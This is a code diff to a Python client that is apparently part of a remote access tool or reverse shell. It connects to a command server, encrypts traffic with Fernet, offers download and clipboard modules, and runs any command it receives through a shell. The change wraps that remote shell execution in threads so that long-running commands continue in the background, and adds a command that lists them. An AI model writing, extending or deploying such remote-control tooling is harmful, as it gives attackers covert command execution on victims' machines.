@@ -7,6 +7,7 @@ import struct
 import subprocess
 import sys
 import time
+import threading
 
 import requests
 from cryptography.fernet import Fernet
@@ -14,6 +15,7 @@ from cryptography.fernet import Fernet
 commands = '\nAvaliable Modules\n'
 
 commands += '- download {url} (Downloads file from URL)\n'
+commands += '- threads (see running threads)\n'
 
 try:
     import pyperclip
@@ -34,12 +36,38 @@ except Exception as e:
     _zipfile = False
 
 
+class Threader(threading.Thread):
+
+    def __init__(self, group=None, target=None, name=None,
+                 args=(), kwargs={}, Verbose=None):
+        threading.Thread.__init__(self, group, target, name, args, kwargs)
+        self._args = args
+        self._return = None
+        threading.Thread.daemon = True
+        self._kill = threading.Event()
+        self._interval = 10
+
+    def run(self):
+        if self._target is not None:
+            self._return = self._target(*self._args, **self._kwargs)
+
+    def join(self, *args):
+        threading.Thread.join(self, *args)
+        return self._return
+
+    def kill(self):
+        self._kill.set()
+
+
 class Client(object):
 
     def __init__(self):
         self.serverHost = '127.0.0.1'
         self.serverPort = 9999
         self.socket = None
+        self.Threads = []
+        # Time to wait for threads to finish
+        self.WAIT_TIME = 10
         # Generate Key
         # key = Fernet.generate_key()
 
@@ -109,6 +137,14 @@ class Client(object):
                 return ""
         if data[:7].lower() == 'modules':
             return commands
+        if data[:7].lower() == 'threads':
+            return_threads = "Threads:\n\n"
+            for thr in self.Threads:
+                if thr.isAlive():
+                    return_threads += thr._args[0].decode() + "\n"
+                else:
+                    self.Threads.remove(thr)
+            return return_threads
         if data[:8].lower() == 'download':
             try:
                 url = data[9:]
@@ -177,14 +213,21 @@ class Client(object):
             except Exception as e:
                 output_str = f"Custom command failed: {e}"
             if (output_str == None) and len(data) > 0:
-                try:
-                    cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_str = output_bytes.decode(errors="replace")
-                except Exception as e:
-                    # TODO: Error description is lost
-                    output_str = "Command execution unsuccessful: %s" %str(e)
+                def shell(data):
+                    try:
+                        cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
+                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                        return output_bytes.decode(errors="replace")
+                    except Exception as e:
+                        # TODO: Error description is lost
+                        return "Command execution unsuccessful: %s" %str(e)
+                self.Threads.append(Threader(target=shell, args=(data,)))
+                self.Threads[-1].start()
+                output_str = self.Threads[-1].join(self.WAIT_TIME)
+                if self.Threads[-1].isAlive():
+                    output_str = "Command took too long... Will keep running in background."
+
             if output_str is not None:
                 try:
                     self.print_output(output_str + "\n")
